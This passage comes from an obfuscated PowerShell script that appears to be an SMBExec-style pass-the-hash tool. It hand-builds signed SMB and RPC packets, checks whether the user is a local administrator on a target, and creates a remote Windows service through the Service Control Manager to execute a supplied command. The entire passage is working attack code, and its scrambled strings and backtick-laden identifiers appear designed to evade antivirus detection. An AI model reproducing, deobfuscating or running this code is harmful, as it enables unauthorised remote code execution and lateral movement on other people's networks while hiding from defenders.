                            [Byte[]]${sm`B_SIg`Ni`Ng_S`eQUENCe} =  (  &("{0}{3}{1}{2}" -f'GEt-v','AB','LE','aRI') ("81"+"4") ).vALUe::("{0}{1}{2}" -f 'GetByt','e','s').Invoke(${smB_SIg`Ni`Ng_C`OuN`T`er}) + 0x00,0x00,0x00,0x00
                            ${P`AcKEt_S`mB_heA`Der}[("{2}{0}{3}{1}"-f'BH','e','SM','eader_Signatur')] = ${SMb_SIg`N`ing_SEquE`N`cE}
                        }

                        ${PaCK`eT`_S`CM`_daTa} = &("{5}{4}{0}{2}{3}{1}" -f'SCMOp','erW','enSCMan','ag','Packet','Get-') ${sMb`_SeRVI`CE_ByT`Es} ${Sm`B`_sERVIC`e_leN`gTH}
                        ${S`cM`_DAtA} = &("{3}{1}{5}{0}{6}{2}{4}" -f'om-','onvertF','dere','C','dDictionary','r','PacketOr') ${PACket_`scM`_`dA`Ta}
                        ${PaCKEt`_rPC`_`DA`TA} = &("{5}{0}{1}{3}{2}{4}"-f 'a','cket','CReques','RP','t','Get-P') 0x03 ${S`Cm_D`AtA}."LE`N`gTh" 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        ${rPC_`Da`Ta} = &("{5}{1}{4}{0}{3}{2}"-f'tOrd','rtFrom-Pack','redDictionary','e','e','Conve') ${P`Ac`kEt_R`pC_`DaTA}
                        ${sM`B_hEA`der} = &("{1}{6}{0}{7}{2}{3}{5}{4}" -f 'nve','C','rom-Packe','tOrdere','ionary','dDict','o','rtF') ${PAcKET`_`Smb`_heA`deR}   
                        ${pAckE`T`_s`MB`_DaTA} = &("{2}{6}{7}{4}{3}{5}{8}{0}{1}" -f 'An','dXRequest','G','tSM','ke','BWri','et-Pa','c','te') ${smB_`FId} (${R`pc_DaTA}."lEn`gTH" + ${Scm`_Da`TA}."len`GTH")
                        ${Sm`B_Da`Ta} = &("{3}{1}{4}{0}{7}{6}{2}{8}{5}"-f 'ack','vert','rderedD','Con','From-P','nary','O','et','ictio') ${Packe`T_sMB`_`da`TA} 
                        ${rpc`_`DaTA_LE`N`Gth} = ${sM`B_datA}."L`e`NgTh" + ${S`cM_`da`TA}."lENG`Th" + ${rpC_`da`TA}."LEN`GTh"
                        ${pAc`k`eT_`NEtbios`_SeSSI`On_`SeRv`iCE} = &("{5}{7}{0}{3}{2}{4}{6}{1}" -f '-Pa','ice','etBI','cketN','OSSe','Ge','ssionServ','t') ${S`MB`_heaDeR}."LE`NGTh" ${R`pc_`daTA_le`N`gTh}
                        ${nET`Bi`oS_seSSi`on_SERV`I`cE} = &("{1}{9}{3}{8}{5}{6}{4}{0}{2}{7}"-f'ct','Conver','iona','ro','rderedDi','-Packe','tO','ry','m','tF') ${p`Ac`kET_nE`TBiO`S_Session_`S`ER`V`I`CE}

                        if(${Sm`B_SIGN`Ing})
                        {
                            ${smb_`S`iGN} = ${Sess`ION_k`Ey} + ${sM`B_`hEaD`er} + ${sMB`_`DatA} + ${rPc`_D`ATa} + ${s`cm_d`ATa}
                            ${SM`B`_siG`NATUre} = ${m`D5}."c`Om`pUTe`hASH"(${SMb_`SI`gN})
                            ${Smb`_SI`G`NAtuRe} = ${SMb_sig`NaT`U`RE}[0..7]
                            ${paC`KEt_sM`B`_H`eAD`ER}[("{3}{0}{1}{2}" -f 'eader_Sign','a','ture','SMBH')] = ${smB_s`iG`N`ATure}
                            ${SM`B_`HeAder} = &("{6}{0}{3}{8}{2}{4}{7}{1}{5}" -f'ro','ion','Order','m-Packe','edD','ary','ConvertF','ict','t') ${P`AckEt`_SMB_heA`deR}
                        }

                        ${smB_cLIEnt_`s`EnD} = ${ne`TBioS_`S`esSIon_`S`ervi`cE} + ${S`MB_he`AD`er} + ${SmB`_da`TA} + ${r`Pc`_DaTA} + ${scm`_`D`Ata}
                        ${SM`B`_cL`iENT_sT`R`eAm}.("{0}{1}"-f 'Wri','te').Invoke(${S`MB_cL`IEnt`_Se`ND},0,${s`M`B_CLI`E`Nt_`SENd}."LenG`Th") > ${NU`lL}
                        ${s`M`B_clIen`T`_sTr`eam}.("{0}{1}" -f 'Flus','h').Invoke()
                        ${Sm`B_C`LIe`NT`_sTr`Eam}.("{0}{1}"-f 'Rea','d').Invoke(${sMB_C`Li`E`Nt_`Re`CeiVe},0,${s`Mb_cLiE`Nt_R`E`c`eIvE}."lE`NGth") > ${NU`ll}
                        ${Sm`B`_CLienT`_S`TAGE} = ("{4}{2}{3}{1}{0}" -f't','ques','a','dAndXRe','Re')
                        ${s`mB_C`l`ie`Nt_STaGe_nexT} = ("{2}{0}{1}" -f 'es','s','CheckAcc')           
                    }

                    ("{3}{0}{2}{1}"-f'A','ess','cc','Check')
                    {

                        if( (&("{0}{2}{1}" -f 'V','LE','aRiab') 814  ).VAluE::"t`o`striNg"(${Sm`B_ClieNT_R`eC`e`IVE}[108..111]) -eq ("{0}{1}{2}"-f'00-','00-00','-00') -and  ${8`14}::"T`oST`RInG"(${SMb_cl`i`EN`T`_R`ECE`Ive}[88..107]) -ne ("{3}{5}{9}{7}{1}{8}{2}{0}{4}{6}"-f'0-0','00-00-0','-00-00-00-00-00-0','00','0-00-0','-','0-00-00','00-','0-00-00-00','00-'))
                        {
                            ${SMB_`sERV`iCE`_m`ANAg`er_c`ONt`eXT_h`AN`D`le} = ${sm`B_clIenT`_rE`CEi`Ve}[88..107]

                            if(${SMb_`EXe`CUTe})
                            {
                                &("{1}{0}{3}{2}" -f 'i','Wr','se','te-Verbo') ("$output_username "+'i'+'s '+'a '+'loca'+'l '+'ad'+'mini'+'strat'+'or '+'o'+'n '+"$Target")  
                                ${packet_sCM`_D`A`TA} = &("{2}{3}{1}{0}{5}{4}" -f 'e','S','Get-PacketS','CMCreate','iceW','rv') ${Sm`B_SeRViC`e_MA`NA`ger`_coNT`E`xT_han`d`le} ${smb`_s`ERvi`ce_ByTES} ${s`Mb_ServiCe_l`eNG`Th} ${sM`Bex`ec_coMMAND`_`BYtES} ${sM`BE`XeC_co`M`Ma`Nd_LENGth_By`T`Es}
                                ${SC`m_d`Ata} = &("{0}{4}{5}{6}{1}{2}{3}"-f 'Convert','t','OrderedDictionar','y','From-P','a','cke') ${p`AcK`Et_`Scm_dA`Ta}

                                if(${S`C`M_dATA}."len`GtH" -lt ${S`m`B_sPLiT_inD`ex})
                                {
                                    ${SMB_C`LienT_`sta`ge} = ("{1}{0}{2}"-f 'ate','Cre','ServiceW')
                                }
                                else
                                {
                                    ${SmB_Cli`ent`_Sta`gE} = ("{2}{4}{3}{0}{1}"-f'_F','irst','Cr','rviceW','eateSe')
                                }

                            }
                            else
                            {
                                &("{1}{0}{2}{3}" -f'ite-Out','Wr','pu','t') ("$output_username "+'is'+' '+'a '+'loca'+'l '+'admin'+'i'+'strator'+' '+'on'+' '+"$Target")
                                ${S`mB_`Close_s`E`RvI`cE_hAND`L`e_s`Ta`Ge} = 2
                                ${SmB_ClIen`T`_sT`Age} = ("{4}{3}{5}{1}{0}{2}"-f'vi','r','ceHandle','oseS','Cl','e')
                            }

                        }
                        elseif(  ( &("{1}{2}{0}" -f'M','ChIlD','itE') ("vaRIAble"+":8"+"1"+"4")  ).ValUe::"T`osT`RiNG"(${sm`B_Cl`ie`Nt`_Rec`e`IvE}[108..111]) -eq ("{0}{1}{2}"-f'05','-00-00-0','0'))
                        {
                            &("{3}{1}{0}{2}"-f'tpu','Ou','t','Write-') ("$output_username "+'i'+'s '+'not'+' '+'a '+'lo'+'cal '+'adm'+'inis'+'trat'+'or '+'o'+'r '+'d'+'oes '+'n'+'ot '+'have'+' '+'re'+'qu'+'ired '+'pri'+'vi'+'lege '+'on'+' '+"$Target")
                            ${smBex`e`C_FaILeD} = ${tr`UE}
                        }
                        else
                        {
                            &("{1}{2}{0}"-f'ut','Wr','ite-Outp') ('Som'+'ethi'+'n'+'g '+'wen'+'t '+'wr'+'on'+'g '+'w'+'ith '+"$Target")
                            ${smBeXEC`_f`Ailed} = ${t`RUE}
                        }

                    }
                
                    ("{4}{2}{1}{3}{0}" -f'rviceW','ateS','re','e','C')
                    {
                        ${paCK`eT_SMB`_hEA`der} = &("{2}{1}{0}{3}"-f 'MBH','ketS','Get-Pac','eader') 0x2f 0x18 0x05,0x28 ${Smb`_treE_`iD} ${P`ROcess`_`iD_`ByT`Es} ${Sm`B`_uSER_ID}

                        if(${SMb`_s`ignIng})
                        {
                            ${P`Acke`T_Smb_H`e`Ad`ER}[("{0}{2}{1}" -f'SMBHea','r_Flags2','de')] = 0x05,0x48
                            ${sm`B_Si`GnIng_`CO`UNtER} = ${S`Mb`_sI`G`NIng_COu`NTer} + 2 
                            [Byte[]]${sMB_S`IG`Nin`G_S`EQuen`ce} =   (  &("{1}{2}{0}" -f 'tEm','Get-c','HIldI') ('VA'+'rIABL'+'E:'+'814') ).vaLuE::("{1}{2}{0}" -f'tes','Get','By').Invoke(${smB`_s`IG`NING_cOuN`Ter}) + 0x00,0x00,0x00,0x00
                            ${Pac`K`et_s`Mb_HE`AdEr}[("{1}{4}{2}{3}{0}" -f'nature','SMBHe','S','ig','ader_')] = ${s`mb_s`IgNi`NG_`sEqUE`NCE}
                        }

                        ${pac`KET_scm`_da`TA} = &("{1}{5}{4}{0}{2}{3}"-f'Cr','G','eate','ServiceW','cketSCM','et-Pa') ${Sm`B_SErvi`c`e_mAn`AG`ER_C`ONtexT`_hA`NDle} ${s`MB`_Serv`ic`E_BYTES} ${Sm`B_Se`Rv`icE_lengTH} ${S`M`BeXEC`_CommA`ND`_bYtES} ${s`MbEXec`_CO`MmAN`d_L`e`NGtH_BY`TES}
                        ${sC`m`_DAta} = &("{4}{1}{6}{0}{3}{7}{5}{2}"-f 'o','nv','ctionary','m-PacketO','Co','i','ertFr','rderedD') ${P`A`cKEt_S`cM`_Data}
                        ${P`Ac`KeT_rPc`_Da`TA} = &("{2}{3}{1}{0}" -f'uest','etRPCReq','Get-','Pack') 0x03 ${S`cM_Da`TA}."LenG`Th" 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                        ${RPc`_da`TA} = &("{1}{2}{7}{3}{0}{4}{5}{6}{9}{8}" -f 'c','C','o','ertFrom-Pa','ketOrder','e','dD','nv','ctionary','i') ${p`Ac`KE`T_Rpc_D`ATa}
                        ${S`Mb_hEA`dEr} = &("{3}{4}{0}{1}{2}{5}" -f'm-Pa','c','ketOrder','Conve','rtFro','edDictionary') ${Pa`C`k`eT_SM`B_`hEADEr}   
                        ${P`ACKe`T_`SmB_da`TA} = &("{5}{1}{3}{6}{0}{4}{2}"-f 'XR','PacketSM','t','BWrite','eques','Get-','And') ${s`m`B_fID} (${Rp`C_`dAta}."L`ENgTH" + ${SC`M_d`AtA}."LEn`g`TH")
                        ${s`MB_`dAta} = &("{7}{0}{6}{8}{2}{5}{4}{1}{9}{3}" -f'F','ction','d','ry','i','eredD','rom-Packet','Convert','Or','a') ${pa`CKET_Smb_`d`A`Ta}
                             
                        ${RP`C_dAT`A_l`EnG`Th} = ${Smb_`da`TA}."le`NG`Th" + ${s`cM`_datA}."L`ENGth" + ${Rpc_`DA`Ta}."Len`gth"
                        ${pa`CKeT_netB`ioS_sE`s`Sion_SER`VICE} = &("{4}{6}{3}{5}{0}{2}{1}"-f'es','ice','sionServ','tBI','Ge','OSS','t-PacketNe') ${sM`B_`HEAdeR}."lE`NgTh" ${RPC_D`ATa_`L`enGTh}
                        ${N`Et`B`iOs_SE`SS`iOn_ser`V`Ice} = &("{0}{1}{2}{7}{3}{8}{6}{5}{9}{4}"-f'Conve','r','t','-Pack','nary','icti','edD','From','etOrder','o') ${PA`ckEt`_n`et`BIOS`_se`sSiOn_seRVIcE}

                        if(${Smb_`Sig`Ning})
                        {
                            ${s`M`B_sIGn} = ${s`ESsI`On_K`ey} + ${SMb_`hEAd`Er} + ${S`mB_`dAtA} + ${r`P`C_da`Ta} + ${ScM_`d`ATa}
                            ${sMB`_S`iG`NATURE} = ${m`d5}."C`o`mPuTE`hasH"(${S`MB_`SIGn})
                            ${sMb`_SigN`A`T`URE} = ${sMb_`S`iGnaTu`RE}[0..7]
                            ${PAcK`et`_smb_HEaD`eR}[("{1}{5}{4}{0}{2}{3}" -f 'gna','SMBH','tu','re','ader_Si','e')] = ${SM`B_SI`GNATu`RE}
                            ${s`mb`_He`AdER} = &("{0}{2}{9}{8}{6}{1}{5}{3}{7}{4}" -f 'Conv','rde','ert','i','tionary','redD','ketO','c','ac','From-P') ${p`Ac`KET_SMB_`HE`ADEr}
                        }

                        ${smb_Cl`i`E`NT_SeNd} = ${Ne`TbIOS_se`SSiOn`_`s`erViCE} + ${s`Mb_HEA`dER} + ${S`mB`_DATA} + ${RPC`_`DAta} + ${scm_`d`ATa}
                        ${s`Mb_clie`Nt`_StReAm}.("{1}{0}"-f'ite','Wr').Invoke(${SMB_CLi`En`T`_`SEND},0,${S`Mb_`CLiENT`_SEnd}."len`gth") > ${nu`ll}
                        ${S`mb`_c`LIeNT_STRE`Am}.("{0}{1}" -f'Flu','sh').Invoke()
                        ${Sm`B_c`lIEn`T_stRe`AM}.("{0}{1}" -f'R','ead').Invoke(${sMB_c`l`IEnt_rE`ce`I`VE},0,${sM`B_clI`E`N`T_rEC`EI`Ve}."LEN`gth") > ${n`Ull}
                        ${smb_Cl`i`E`N`T_StaGE} = ("{0}{1}{2}{4}{3}" -f 'ReadA','n','dXRe','est','qu')
                        ${SmB_`cLIE`N`T_`sta`gE_N`ExT} = ("{0}{1}{2}"-f'StartSe','rv','iceW')
                    }

                    ("{4}{3}{1}{0}{2}" -f 'viceW_Firs','eSer','t','at','Cre')
                    {
                        ${smb_sP`LI`T`_sTaGE_F`INAL} =   (&("{1}{0}" -f'I','gC') ("{4}{3}{0}{1}{2}"-f 'Ia','blE:Q2T9h','D','r','vA')  ).VaLuE::("{1}{0}"-f'ling','Cei').Invoke(${s`cm_`DatA}."l`eNgtH" / ${SmB_s`pLi`T_in`dEX})
                        ${pac`kEt_smb_`HeA`dER} = &("{4}{2}{0}{3}{1}"-f'cketS','der','a','MBHea','Get-P') 0x2f 0x18 0x05,0x28 ${Sm`B_t`RE`e_Id} ${prOC`eSs_`ID_B`Y`TEs} ${SmB_`U`sER_`ID}

                        if(${s`mB_`Signi`NG})
                        {
                            ${PACKET_s`MB`_`hEaD`Er}[("{2}{1}{3}{0}"-f'lags2','H','SMB','eader_F')] = 0x05,0x48
                            ${Sm`B_Sign`IN`G_`CO`UntER} = ${smb`_`sIG`N`InG`_c`OuNtER} + 2 
                            [Byte[]]${s`MB_SigNin`G_Se`QuE`N`ce} =   (&("{1}{0}"-f 'rIablE','VA')  814 -va )::("{0}{1}"-f 'GetByte','s').Invoke(${SMb_s`IGNING_`COun`TEr}) + 0x00,0x00,0x00,0x00
                            ${PACKe`T_Smb_`H`Ea`dER}[("{0}{2}{3}{4}{5}{1}"-f'SM','ure','BHeade','r','_S','ignat')] = ${S`Mb_sI`GNInG_seq`UE`Nce}
                        }

                        ${scm`_d`Ata`_firsT} = ${sCm_`D`ATA}[0..(${SMb_sP`l`iT`_I`Ndex} - 1)]
                        ${p`A`CKET_RP`c_da`TA} = &("{2}{0}{4}{1}{5}{3}"-f'Pac','PCRe','Get-','uest','ketR','q') 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${scm_da`Ta_F`I`R`St}
                        ${PAcket`_R`pc`_d`ATa}[("{2}{0}{4}{3}{1}"-f '_A','t','RPCRequest','locHin','l')] =  (&("{3}{1}{0}{2}" -f 'ditE','il','m','gET-cH')  ('Va'+'RIAbL'+'e:814')  ).VaLUe::("{1}{2}{0}"-f 'ytes','Get','B').Invoke(${scM`_dA`TA}."LEn`g`TH")
                        ${SmB_SPLiT`_i`NDEx`_`TRaCker} = ${s`mB`_`sPLIt_iN`dEX}
                        ${RP`c_d`AtA} = &("{3}{7}{2}{5}{9}{4}{1}{0}{6}{8}"-f 'Di','ered','k','ConvertFrom','Ord','e','ct','-Pac','ionary','t') ${pACK`et_`Rpc`_Data}
                        ${sMb_hE`Ad`ER} = &("{4}{1}{5}{0}{3}{2}"-f'etOr','rtFrom-Pac','nary','deredDictio','Conve','k') ${PA`c`kEt_s`mb_`heaDER}
                        ${pa`c`KeT_SMB_d`AtA} = &("{0}{7}{6}{5}{2}{1}{4}{3}" -f 'G','AndXR','SMBWrite','t','eques','et','Pack','et-') ${SmB_`FID} ${r`pC`_dATA}."lE`NgTh"
                        ${SMB_`dA`Ta} = &("{2}{1}{5}{6}{3}{0}{4}"-f'n','vertFrom-PacketOrderedDi','Con','io','ary','c','t') ${PackEt_sM`B_`da`Ta}     
                        ${rPc_dat`A`_LE`NG`TH} = ${S`M`B_DaTa}."lENG`Th" + ${RP`c_D`ATa}."l`EngTh"
                        ${PAck`E`T_neTB`IOS_`SessiOn_S`eRVI`Ce} = &("{4}{7}{1}{0}{6}{8}{3}{5}{2}"-f'tNe','Packe','vice','essi','G','onSer','tB','et-','IOSS') ${S`M`B_h`eadeR}."Le`NGtH" ${Rp`c_D`Ata`_`LenGTh}
                        ${N`e`TBI`os_`S`E`ssiOn_sERVi`CE} = &("{5}{7}{6}{2}{0}{8}{9}{4}{1}{3}"-f'm','dDiction','o','ary','e','Conver','r','tF','-Pac','ketOrder') ${PACKe`T_NETBiO`S`_SESs`iOn`_se`R`VIce}

                        if(${S`MB`_sIGnIng})
                        {
                            ${Sm`B`_SIGN} = ${seS`si`oN_`key} + ${s`M`B`_hEAder} + ${sM`B_DA`Ta} + ${R`PC_`DATa}
                            ${S`MB_s`Ig`Na`Ture} = ${M`d5}."comp`UtE`HA`sh"(${SMB`_`siGn})
                            ${s`M`B_SIGNA`TuRe} = ${SmB`_sig`Na`Ture}[0..7]
                            ${PA`cKeT_SMB_HE`A`deR}[("{0}{2}{1}{3}"-f 'S','Sig','MBHeader_','nature')] = ${sMB_`s`IgNaT`URe}
                            ${S`Mb_h`ead`ER} = &("{3}{1}{6}{0}{2}{5}{4}"-f'r','tFro','ed','Conver','ionary','Dict','m-PacketOrde') ${PACke`T_SMb`_hE`AdER}
                        }

                        ${S`mB`_cLieN`T_SEnD} = ${nE`TbiO`s_seSSion_s`E`R`V`icE} + ${sMB`_h`Eader} + ${sM`B_`DaTa} + ${rpc_D`A`Ta}
                        ${sMB_cl`IE`N`T_`STRE`AM}.("{0}{1}"-f'Writ','e').Invoke(${sMB_C`lie`Nt_se`ND},0,${smB_ClI`eN`T`_SenD}."lEng`TH") > ${nu`Ll}
                        ${s`mB_`Clien`T_StReam}.("{0}{1}"-f 'F','lush').Invoke()
                        ${Smb_C`li`Ent_`s`TReAM}.("{1}{0}" -f 'ad','Re').Invoke(${SM`B_ClIent_`Re`CeIvE},0,${S`Mb_c`L`I`e`NT_REcEiVE}."l`eng`Th") > ${nu`Ll}

                        if(${smb_SPL`It`_S`T`AG`E`_fINAL} -le 2)
                        {
                            ${s`MB_c`lIeN`T_s`TAGE} = ("{3}{2}{0}{4}{1}"-f 'teSe','_Last','ea','Cr','rviceW')
                        }
                        else
                        {
                            ${SMB_s`plIt_`st`A`GE} = 2
                            ${sm`B_cLiEn`T`_staGE} = ("{0}{3}{4}{2}{5}{1}" -f'C','le','viceW_Mi','reat','eSer','dd')
                        }

                    }

                    ("{2}{4}{5}{6}{0}{1}{3}" -f 'rviceW_M','idd','Cre','le','at','eS','e')
                    {
                        ${sMb`_`SPlit`_S`TAgE}++
                        ${PaCKE`T_smB`_hEaD`ER} = &("{2}{3}{0}{1}"-f '-Packet','SMBHeader','Ge','t') 0x2f 0x18 0x05,0x28 ${Sm`B_t`R`EE_iD} ${ProC`eSs`_`I`D`_ByTes} ${s`m`B_U`Ser_Id}

                        if(${SMB_si`gN`I`Ng})
                        {
                            ${P`ACKet_`sM`B`_HeAd`Er}[("{4}{0}{2}{1}{3}" -f'ea','F','der_','lags2','SMBH')] = 0x05,0x48
                            ${Smb_Si`g`NINg_CouNt`Er} = ${smb_siGNiN`G_`co`U`NT`eR} + 2 
                            [Byte[]]${sMb_S`iG`NI`NG_seQ`UenCe} =  (  &("{0}{1}" -f 'CHILd','iTEm') ('VAriABl'+'E:'+'814') ).vALuE::("{1}{0}{2}" -f 'yt','GetB','es').Invoke(${smB_sI`G`NInG_CoU`N`T`er}) + 0x00,0x00,0x00,0x00
                            ${Pac`ket_`SmB_`heA`DER}[("{0}{2}{3}{5}{4}{1}"-f'S','gnature','MBH','ea','Si','der_')] = ${S`m`B`_Si`GnIng_s`EQUEncE}
                        }

                        ${S`cM_`dat`A_miDDLe} = ${s`C`M_daTa}[${SmB`_SPlIT`_I`N`d`EX_Tr`ACKeR}..(${sM`B`_s`PLIT_`iND`EX_TR`Ac`kER} + ${S`M`B`_sPLiT_INDEx} - 1)]
                        ${SMB_s`pL`it`_`i`Nd`ex_trACkER} += ${sMb_`spLiT_`IND`ex}
                        ${pa`Ck`ET`_R`Pc_DA`TA} = &("{4}{0}{5}{3}{1}{2}" -f't-Pac','e','st','etRPCRequ','Ge','k') 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${ScM`_dAtA`_miDd`le}
                        ${Pac`k`ET_rP`C_dATa}[("{6}{5}{0}{3}{1}{2}{4}"-f'equ','t_','Alloc','es','Hint','PCR','R')] =   (&("{0}{1}{3}{2}"-f 'GeT','-','iLDiTEm','ch')  ("{2}{3}{0}{1}" -f':81','4','var','IAble')).vALUE::("{1}{0}"-f 's','GetByte').Invoke(${SCm`_`dATa}."leN`gTH" - ${SMb_SPl`It_IN`Dex_T`R`AcKer} + ${Sm`B_sPlit`_`I`NDEX})
                        ${r`PC_`dAtA} = &("{5}{3}{1}{2}{0}{6}{4}" -f 'Order','c','ket','vertFrom-Pa','onary','Con','edDicti') ${PacKET_`RpC`_`dA`TA}
                        ${SM`B`_heADeR} = &("{1}{2}{4}{6}{3}{5}{0}"-f 'ary','Co','nvert','e','Fr','redDiction','om-PacketOrd') ${PaCk`e`T_`smb_H`eAder}
                        ${pA`CKeT_`Sm`B_Da`Ta} = &("{7}{6}{1}{8}{0}{4}{2}{3}{5}" -f 'Wr','ket','A','ndXReques','ite','t','Pac','Get-','SMB') ${s`m`B_fiD} ${RPC_`data}."l`engTh"
                        ${sM`B`_DATA} = &("{2}{1}{3}{5}{4}{6}{0}"-f 'onary','onvertFr','C','om-Pack','OrderedDict','et','i') ${P`A`cK`e`T_smb_daTA}     
                        ${r`PC_DAtA_l`e`NGth} = ${s`mb`_DATa}."lenG`Th" + ${rP`C_`dAtA}."L`en`GTh"
                        ${paCkET_NetbI`o`s_`se`ss`i`On_Se`RV`ICE} = &("{4}{1}{6}{3}{5}{0}{2}" -f'rvi','tBIOS','ce','ess','Get-PacketNe','ionSe','S') ${s`m`B_HeAd`ER}."l`EN`gTH" ${RPc_`daTA_l`ENGTH}
                        ${neTbi`O`s_Se`sSi`On_SErViCE} = &("{2}{0}{3}{1}{6}{4}{5}"-f'F','Packe','Convert','rom-','r','y','tOrderedDictiona') ${Pa`cKeT_Ne`TbIOS_sEsSi`ON_sER`Vi`ce}

                        if(${SMB_`siGN`ing})
                        {
                            ${smB`_S`IGN} = ${S`ess`IoN_K`EY} + ${smB_`He`ADER} + ${Sm`B_Da`TA} + ${rPc_d`A`TA}
                            ${sM`B_S`IgNAT`UrE} = ${M`D5}."Co`MPuTe`haSH"(${S`Mb_s`iGN})
                            ${SM`B_S`IGnatURe} = ${s`MB_SIgna`T`UrE}[0..7]
                            ${packeT`_s`Mb`_hea`der}[("{4}{3}{2}{1}{0}" -f 'ture','na','ig','der_S','SMBHea')] = ${S`mb`_sIGnATURe}
                            ${S`Mb_He`A`deR} = &("{8}{0}{6}{4}{3}{1}{2}{7}{5}"-f'vertFrom-P','r','edDi','rde','cketO','ry','a','ctiona','Con') ${PAcKet_`s`mB`_heAD`eR}
                        }

                        ${sm`B_ClIENt_S`END} = ${N`etbI`oS_`seSSiON_Ser`VICe} + ${Smb`_He`A`dER} + ${s`mB_`dAtA} + ${R`PC_D`AtA}
                        ${s`mB_CLIe`Nt`_strEAm}.("{0}{1}"-f 'W','rite').Invoke(${smB_`ClIe`NT`_SEnD},0,${Smb_c`lie`Nt_SEnd}."lE`NGth") > ${nU`LL}
                        ${smb_CLieNt_s`T`R`eAM}.("{0}{1}"-f'Flu','sh').Invoke()
                        ${s`MB_C`lI`eNT_S`TRe`AM}.("{1}{0}" -f 'ead','R').Invoke(${SMB`_CL`Ien`T_rE`c`EIve},0,${SM`B`_cliENT_Re`C`eiVe}."l`engtH") > ${n`ULl}

                        if(${s`mb_S`PLi`T_st`AGE} -ge ${S`Mb_S`PLIt_`sTa`G`e`_fiNAl})
                        {
                            ${sMB_Cl`IEN`T_S`TaGE} = ("{4}{3}{1}{2}{0}" -f 't','eateServiceW_','Las','r','C')
                        }
                        else
                        {
                            ${SmB_clIen`T_s`T`A`ge} = ("{2}{4}{0}{3}{1}" -f'r','eW_Middle','Cr','vic','eateSe')
                        }

                    }

                    ("{5}{0}{1}{4}{2}{3}" -f'Servi','c','W_L','ast','e','Create')
                    {
                        ${PAckE`T`_`sMB_`H`eADEr} = &("{5}{2}{3}{1}{4}{0}"-f'er','H','c','ketSMB','ead','Get-Pa') 0x2f 0x18 0x05,0x48 ${sm`B_TRE`E_id} ${P`R`OcES`S_id`_bYteS} ${S`m`B_US`ER_iD}

                        if(${S`Mb_s`Ign`iNg})
                        {
                            ${PacKe`T`_Smb_HEa`dER}[("{0}{1}{2}{3}{4}" -f'S','MBH','eader_Fl','ags','2')] = 0x05,0x48
                            ${s`mb`_SIGnIN`g_cou`NT`Er} = ${S`mb`_`sIGnIn`g_cO`Unt`eR} + 2 
                            [Byte[]]${SmB_`sigNI`Ng`_S`e`queN`CE} =   ${8`14}::("{0}{1}{2}"-f'G','etBy','tes').Invoke(${smB_si`gn`i`NG_`CouNteR}) + 0x00,0x00,0x00,0x00
                            ${P`AC`keT_sMB`_HEADER}[("{2}{1}{4}{3}{0}" -f'ignature','BHe','SM','r_S','ade')] = ${S`Mb`_SigNinG_`seQu`EncE}
                        }

                        ${S`Cm_da`TA_laST} = ${S`cM`_DatA}[${Smb_Spl`I`T_i`NDe`x_t`RA`CKeR}..${Scm`_D`AtA}."L`eN`GtH"]
                        ${p`ACK`ET_RPc`_`dATA} = &("{0}{3}{1}{2}"-f 'Get-','CReque','st','PacketRP') 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${scM_DA`Ta_`lA`ST}
                        ${R`P`C_dAta} = &("{1}{4}{6}{2}{0}{3}{5}" -f'd','Co','tOrdere','Dictio','nver','nary','tFrom-Packe') ${Pa`CkE`T`_rPC_dATA} 
                        ${s`M`B_HeadeR} = &("{5}{2}{4}{0}{3}{1}"-f 'tOrderedDic','y','From-P','tionar','acke','Convert') ${PaCKE`T`_`SmB`_HEaDER}   
                        ${PAcket_`sMb_`D`Ata} = &("{0}{4}{2}{7}{1}{3}{6}{5}" -f 'G','eAndXR','t-PacketS','e','e','est','qu','MBWrit') ${Smb`_`FID} ${r`Pc_d`Ata}."LE`Ngth"
                        ${s`MB`_DAtA} = &("{0}{2}{5}{3}{1}{4}"-f 'C','deredDiction','onve','From-PacketOr','ary','rt') ${PAC`KeT_s`m`B_data}
                        ${Rpc_`datA`_`leNGTh} = ${Sm`B_`dATA}."lE`NGTH" + ${RPC_D`A`Ta}."L`eNgTH"
                        ${pack`ET`_nETb`i`OS_`s`esSi`on_`sErVICE} = &("{8}{0}{7}{6}{3}{1}{9}{5}{4}{2}"-f 'k','I','ionService','tB','ss','e','tNe','e','Get-Pac','OSS') ${smb_`H`E`Ader}."lEn`gTH" ${RPC_`d`Ata_Le`NgTH}
                        ${NE`Tbio`s_s`es`sion_seRv`ICE} = &("{2}{3}{1}{4}{6}{0}{5}"-f'i','eredD','Conver','tFrom-PacketOrd','ic','onary','t') ${Pack`et`_neTbios_sesSio`N`_S`ERvicE}

                        if(${SM`B_sIgn`i`Ng})
                        {
                            ${s`M`B_si`gN} = ${S`e`sS`IoN_Key} + ${SM`B`_HEa`dEr} + ${s`MB_DA`TA} + ${RPC_`Da`Ta}
                            ${SMB_`siGN`ATuRE} = ${m`D5}."c`Om`PUtEHaSh"(${smb`_`siGn})
                            ${S`mb_sI`GnA`TuRe} = ${SMB_SIgN`A`T`U`Re}[0..7]
                            ${PAC`kEt_sMB`_`hEadEr}[("{2}{1}{0}{3}"-f'tu','gna','SMBHeader_Si','re')] = ${sM`B_siGnAtu`Re}
                            ${S`mB_h`EAdEr} = &("{9}{7}{8}{0}{5}{3}{1}{6}{2}{4}"-f 'tFrom','rdere','ona','acketO','ry','-P','dDicti','onv','er','C') ${PaCket`_`smb_heA`DeR}
                        }

                        ${SMb`_`cliEN`T_send} = ${n`ETB`I`o`S_sEs`sI`on_S`ervicE} + ${sMb_HE`A`dEr} + ${s`mB_`data} + ${R`p`C_daTa}
                        ${Smb_c`L`Ien`T_`sTR`eaM}.("{1}{0}"-f 'rite','W').Invoke(${sMB_cLiE`N`T_s`EnD},0,${SM`B`_C`liE`NT_seND}."Le`NGTh") > ${NU`lL}
                        ${SMb`_cLIenT_`s`T`REAM}.("{1}{0}" -f'sh','Flu').Invoke()
                        ${Smb_c`li`enT`_Str`EAm}.("{1}{0}" -f 'ead','R').Invoke(${S`M`B_C`lienT`_recE`IVe},0,${sm`B_CLieNT`_Rec`E`I`Ve}."Le`NgTH") > ${nu`LL}
                        ${Smb`_Cl`iENT_sT`Age} = ("{4}{1}{0}{2}{3}" -f 'adAn','e','dXRe','quest','R')
